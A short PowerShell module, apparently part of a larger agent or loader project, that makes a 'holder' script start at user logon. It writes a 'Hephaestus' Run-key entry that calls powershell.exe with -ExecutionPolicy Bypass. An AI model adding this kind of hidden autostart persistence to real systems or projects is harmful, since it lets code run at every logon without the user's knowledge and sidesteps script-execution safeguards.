. ./utils.ps1
. ./consts_body.ps1

function Add-HolderToStartup {
    
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = "Hephaestus"
    $holderPath = Get-HolderPath
    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$holderPath`" -ArgumentList '-autostart true'"

    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function do_autoregistry {
    try 
    {
        if ($server.autoStart)
        {
            Add-HolderToStartup
        }
    } catch {
        writedbg "Error  DoRegistryAutoStart $_"
    }
}

do_autoregistry